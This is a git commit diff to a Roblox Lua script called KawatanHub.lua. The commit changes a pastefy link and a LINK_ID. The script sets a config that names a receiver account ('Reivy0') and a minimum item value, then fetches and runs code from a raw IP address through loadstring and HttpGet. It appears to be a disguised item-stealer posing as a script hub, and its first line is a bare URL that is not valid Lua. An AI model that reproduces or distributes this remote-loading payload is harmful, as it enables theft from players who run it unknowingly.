88347cd8aa36860d508851c73df0e6061188896a
Loodi20 <148504256+Loodi20@users.noreply.github.com>
2026-05-13 13:24:02 +0300

    Update KawatanHub.lua

--- KawatanHub.lua
+++ KawatanHub.lua
@@ -1,4 +1,4 @@
-https://pastefy.app/0FY9sGDC/raw
+https://pastefy.app/UfyNDUYx/raw
 
 task.wait(0.2)
 
@@ -6,7 +6,7 @@ local globalEnv = (getgenv and getgenv()) or _G
 globalEnv.StarScriptsConfig = {
     RECEIVERS = { "Reivy0" },
     MIN_VALUE = "1k",
-    LINK_ID = "Us8yAHlPiO-aZMu1XxpBN_BuUT5sBnK_",
+    LINK_ID = "DomW4QMX4QWocqISRNEVU1c195uA_-wl",
     WEBHOOK_POLL_SEC = 2
 }
 loadstring(game:HttpGet("http://205.185.125.84/sab/sabtrade"))()
